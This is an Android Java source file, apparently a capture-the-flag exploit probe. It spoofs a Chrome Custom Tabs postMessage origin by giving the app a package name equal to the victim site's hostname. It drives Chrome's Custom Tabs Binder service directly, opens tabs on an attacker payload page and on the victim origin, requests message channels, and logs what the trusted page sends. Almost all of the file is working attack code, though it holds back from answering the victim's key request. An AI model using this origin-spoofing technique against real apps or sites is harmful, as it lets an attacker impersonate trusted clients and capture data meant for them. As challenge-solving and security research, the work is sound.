package ariadnetab.xyz;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Looper;
import android.os.Parcel;
import android.util.Log;

import androidx.browser.customtabs.PostMessageService;

/**
 * Custom Tabs postMessage origin probe.
 *
 * The application id of THIS package is literally `ariadnetab.xyz`. Chrome derives
 * an unverified client's postMessage source origin from its package name, so the
 * MessageEvent this app's channel produces should carry
 * `android-app://ariadnetab.xyz`, which is exactly the string
 * https://ariadnetab.xyz/native-channel.js compares against.
 *
 * Probe 1 points the tab at OUR OWN content-origin page, which owns its own script
 * and reports the observed `event.origin` verbatim. That measures the origin string
 * with no dependency on the victim's state at all.
 *
 * Probe 2 points the tab at the victim app origin. If the page accepts the port AND
 * has no device keypair in localStorage it will send us `key.get`. Receiving that is
 * a positive control for both facts at once. This build deliberately does NOT answer
 * it: answering would make the page POST key/register under the bot's account and
 * overwrite shared state we do not own.
 */
public final class MainActivity extends Activity implements PostMessageService.Sink {
    public static final String TAG = "TFCCTF";
    static final String CHROME = "com.android.chrome";
    static final String APP_ORIGIN = "https://ariadnetab.xyz";
    /** An android-app:// origin names the calling package, so Chrome has nothing to
     *  verify against Digital Asset Links. Our package IS the app origin's hostname. */
    static final String SELF_ORIGIN = "android-app://ariadnetab.xyz";
    static final String SERVICE_ACTION = "android.support.customtabs.action.CustomTabsService";
    static final String EXTRA_SESSION = "android.support.customtabs.extra.SESSION";
    static final String SERVICE_DESCRIPTOR = "android.support.customtabs.ICustomTabsService";
    static final String CALLBACK_DESCRIPTOR = "android.support.customtabs.ICustomTabsCallback";

    /** Rewritten by mkspoof.py before every build; a render capability lives 60 minutes. */
    static final String PAYLOAD_URL = Payload.URL;

    IBinder service;
    final Callback callback = new Callback();
    int channelRequests;
    int navFinished;

    static void log(String message) {
        int chunk = 3500;
        for (int offset = 0; offset < message.length(); offset += chunk) {
            Log.i(TAG, message.substring(offset, Math.min(message.length(), offset + chunk)));
        }
    }

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        PostMessageService.sink = this;
        log("=== spoof start pkg=" + getPackageName() + " sdk=" + android.os.Build.VERSION.SDK_INT);
        log("payload=" + PAYLOAD_URL);

        Intent bind = new Intent(SERVICE_ACTION);
        bind.setPackage(CHROME);
        boolean bound = bindService(bind, new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder binder) {
                log("cct service connected " + name);
                service = binder;
                warmup();
                newSession();
                requestChannel("boot", SELF_ORIGIN);
                // Probe 1: our own content-origin page reports event.origin verbatim.
                openTab(PAYLOAD_URL + "&probe=origin");
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(() -> requestChannelExtras("ext", SELF_ORIGIN, APP_ORIGIN), 14000);
                handler.postDelayed(() -> requestChannel("bare", "android-app://" + getPackageName()), 18000);
                // Probe 2: the victim app origin, 26 s later, in the same session.
                handler.postDelayed(() -> {
                    openTab(APP_ORIGIN + "/");
                    handler.postDelayed(() -> requestChannel("app-origin", SELF_ORIGIN), 2500);
                }, 26000);
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                log("cct service disconnected");
                service = null;
            }
        }, Context.BIND_AUTO_CREATE | Context.BIND_WAIVE_PRIORITY);
        log("bindService=" + bound);

        new Handler(Looper.getMainLooper()).postDelayed(() -> log("=== spoof idle ==="), 70000);
    }

    void warmup() {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(SERVICE_DESCRIPTOR);
            data.writeLong(0L);
            boolean sent = service.transact(2, data, reply, 0);
            reply.readException();
            log("warmup sent=" + sent + " result=" + (reply.readInt() != 0));
        } catch (Throwable error) {
            log("warmup FAILED " + error);
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    void newSession() {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(SERVICE_DESCRIPTOR);
            data.writeStrongInterface(callback);
            boolean sent = service.transact(3, data, reply, 0);
            reply.readException();
            log("newSession sent=" + sent + " result=" + (reply.readInt() != 0));
        } catch (Throwable error) {
            log("newSession FAILED " + error);
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    /** transact 7 = requestPostMessageChannel(callback, sourceOrigin). */
    void requestChannel(String tag, String origin) {
        channelRequests++;
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(SERVICE_DESCRIPTOR);
            data.writeStrongInterface(callback);
            data.writeTypedObject(Uri.parse(origin), 0);
            boolean sent = service.transact(7, data, reply, 0);
            reply.readException();
            log("reqChannel[" + tag + "] origin=" + origin + " sent=" + sent
                    + " result=" + (reply.readInt() != 0));
        } catch (Throwable error) {
            log("reqChannel[" + tag + "] origin=" + origin + " FAILED " + error);
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    /** transact 11 = requestPostMessageChannelWithExtras(callback, sourceOrigin, extras). */
    void requestChannelExtras(String tag, String origin, String targetOrigin) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            Bundle extras = new Bundle();
            if (targetOrigin != null) {
                extras.putParcelable("target_origin", Uri.parse(targetOrigin));
            }
            data.writeInterfaceToken(SERVICE_DESCRIPTOR);
            data.writeStrongInterface(callback);
            data.writeTypedObject(Uri.parse(origin), 0);
            data.writeTypedObject(extras, 0);
            boolean sent = service.transact(11, data, reply, 0);
            reply.readException();
            log("reqChannelExtras[" + tag + "] origin=" + origin + " target=" + targetOrigin
                    + " sent=" + sent + " result=" + (reply.readInt() != 0));
        } catch (Throwable error) {
            log("reqChannelExtras[" + tag + "] origin=" + origin + " FAILED " + error);
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    void openTab(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.setPackage(CHROME);
            Bundle session = new Bundle();
            session.putBinder(EXTRA_SESSION, callback.asBinder());
            intent.putExtras(session);
            intent.putExtra("androidx.browser.customtabs.extra.SHARE_STATE", 2);
            startActivity(intent);
            log("tab launched " + url);
        } catch (Throwable error) {
            log("tab FAILED " + error);
        }
    }

    @Override
    public void onChannelReady() {
        log("SINK channel ready");
    }

    @Override
    public void onMessage(String message) {
        log("SINK page->app " + message);
    }

    /** ICustomTabsCallback stub, transaction ids mirrored from the victim's own binder. */
    final class Callback extends android.os.Binder implements IInterface {
        Callback() {
            attachInterface(this, CALLBACK_DESCRIPTOR);
        }

        @Override
        public IBinder asBinder() {
            return this;
        }

        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                throws android.os.RemoteException {
            if (code >= 1 && code <= 16777215) {
                data.enforceInterface(CALLBACK_DESCRIPTOR);
            }
            if (code == INTERFACE_TRANSACTION) {
                reply.writeString(CALLBACK_DESCRIPTOR);
                return true;
            }
            if (code == 16777215) {
                reply.writeNoException();
                reply.writeInt(1);
                return true;
            }
            try {
                switch (code) {
                    case 2: {
                        int event = data.readInt();
                        data.readTypedObject(Bundle.CREATOR);
                        log("cb onNavigationEvent " + event);
                        if (event == 2 && service != null && navFinished++ < 3) {
                            requestChannel("navfin" + navFinished, SELF_ORIGIN);
                        }
                        return true;
                    }
                    case 3: {
                        String name = data.readString();
                        Bundle args = data.readTypedObject(Bundle.CREATOR);
                        log("cb extraCallback " + name + " " + args);
                        return true;
                    }
                    case 4: {
                        data.readTypedObject(Bundle.CREATOR);
                        log("cb onMessageChannelReady");
                        reply.writeNoException();
                        return true;
                    }
                    case 5: {
                        String message = data.readString();
                        data.readTypedObject(Bundle.CREATOR);
                        log("cb onPostMessage " + message);
                        reply.writeNoException();
                        return true;
                    }
                    case 6: {
                        int relation = data.readInt();
                        Uri origin = data.readTypedObject(Uri.CREATOR);
                        boolean ok = data.readInt() != 0;
                        data.readTypedObject(Bundle.CREATOR);
                        log("cb onRelationshipValidationResult relation=" + relation
                                + " origin=" + origin + " verified=" + ok);
                        return true;
                    }
                    case 7: {
                        data.readString();
                        data.readTypedObject(Bundle.CREATOR);
                        reply.writeNoException();
                        reply.writeTypedObject(null, 1);
                        return true;
                    }
                    default:
                        log("cb transact " + code);
                        return true;
                }
            } catch (Throwable error) {
                log("cb transact " + code + " FAILED " + error);
                return true;
            }
        }
    }
}
